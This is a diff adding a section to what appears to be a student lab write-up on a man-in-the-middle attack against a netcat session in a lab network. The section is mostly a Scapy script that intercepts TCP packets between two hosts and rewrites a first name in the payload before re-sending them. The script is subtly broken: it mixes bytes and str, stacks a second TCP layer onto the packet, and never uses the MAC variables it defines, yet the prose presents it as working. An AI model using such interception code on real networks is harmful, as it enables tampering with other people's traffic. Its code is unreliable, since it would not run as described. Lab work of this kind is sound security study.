@@ -196,3 +196,61 @@ pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt) # Sniff the traffic between H
 This script replaces each typed character in Telnet with the character 'Z', and also allows for redirecting the TCP packets to a spoofed address. Note that I added a new variable ```IP_M``` for the spoofed IP address and ```MAC_M``` for the spoofed MAC address, and modified the ```spoof_pkt()``` function to create and send the spoofed packets.
 
 
+## Launching an  MitM Attack on Netcat
+To modify the previous script to replace every occurrence of a first name in the message with a sequence of A's in the TCP packets exchanged between Host A and Host B communicating via netcat, I added the below code:
+
+```
+#!/usr/bin/env python3
+from scapy.all import *
+
+# Define the IP addresses and MAC addresses for Hosts A, B and M
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+IP_M = "10.9.0.10"
+MAC_M = "02:42:0a:09:00:10"
+
+# Define the first name to be replaced with a sequence of A's
+firstname = "Nigel"
+
+def replace_firstname(data):
+    """
+    Replaces every occurrence of the first name with a sequence of A's
+    in the given data and returns the modified data.
+    """
+    modified_data = data.replace(firstname, 'A' * len(firstname))
+    return modified_data
+
+def spoof_pkt(pkt):
+    """
+    Intercepts the TCP packets exchanged between Host A and Host B communicating via netcat,
+    replaces every occurrence of the first name with a sequence of A's, and forwards the
+    modified packets to the destination.
+    """
+    if pkt.haslayer(TCP):
+        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].dport == 9090:
+            # Create a new packet based on the captured one.
+            newpkt = IP(bytes(pkt[IP]))
+            del newpkt.chksum
+            del newpkt[TCP].chksum
+            # Replace every occurrence of the first name with a sequence of A's.
+            newdata = replace_firstname(pkt[TCP].payload.load)
+            # Send the modified packet to Host B.
+            send(newpkt/TCP(newdata))
+        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt[TCP].sport == 9090:
+            # Create a new packet based on the captured one.
+            newpkt = IP(bytes(pkt[IP]))
+            del newpkt.chksum
+            del newpkt[TCP].chksum
+            # Send the packet to Host A without making any change.
+            send(newpkt)
+
+# Start sniffing the network traffic on the interface eth0.
+sniff(filter="tcp and host " + IP_A + " and host " + IP_B, prn=spoof_pkt, iface="eth0")
+```
+
+In this modified script, I first define the IP addresses and MAC addresses for Hosts A, B and M. <br/>
+We also define the first name to be replaced with a sequence of A's. <br/>
+<br/>
+The ```replace_firstname``` function takes the original data as input and replaces every occurrence of the first name with a sequence of A's of the same length. The ```spoof_pkt``` function intercepts the TCP packets exchanged between Host A and Host B communicating via netcat, replaces every occurrence of the first name with a sequence of A's, and forwards the modified packets to the destination. The ```sniff``` function is used to start sniffing the network traffic on the interface ```eth0```, and calls the ```spoof_pkt``` function for each intercepted packet that matches the specified filter.
